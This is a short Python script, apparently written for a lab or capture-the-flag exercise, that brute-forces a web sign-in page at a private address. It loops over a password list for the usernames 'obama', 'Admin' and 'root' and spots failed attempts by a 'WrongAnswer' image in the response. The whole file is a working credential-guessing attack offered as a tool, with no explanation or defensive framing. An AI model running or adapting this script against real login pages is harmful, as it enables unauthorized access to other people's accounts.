import requests
from bs4 import BeautifulSoup as bs

# proxyDict = {"http"  : "192.168.1.34" }



def brute_force(url, pwd):
	url = url + str(pwd) + "&Login=Login"
	form = requests.get(url)
	soup = bs(form.content, features="html.parser")
	imgs = soup.findAll('img')
	for img in imgs:
		if 'WrongAnswer' in img['src']:
			print('\033[91m' + 'the pwd: ' + pwd + ' is a wrong answer' + '\033[0m')
			return(0)
	return(1)

def main(url, user):
    file = open('password.txt','r').read().split('\n')
    for pwd in file:
    	if brute_force(url, pwd):
    		print('\033[92m' + 'the password for ' +user+ ' is ' + str(pwd) + '\033[0m')
    		break


if __name__ == '__main__':
	username = ['obama', 'Admin', 'root']
	for user in username:
		print("***********let's try to find the passeword with login: " + user + "***********")
		url = "http://192.168.1.34/?page=signin&username=" + user + "&password="
		main(url, user)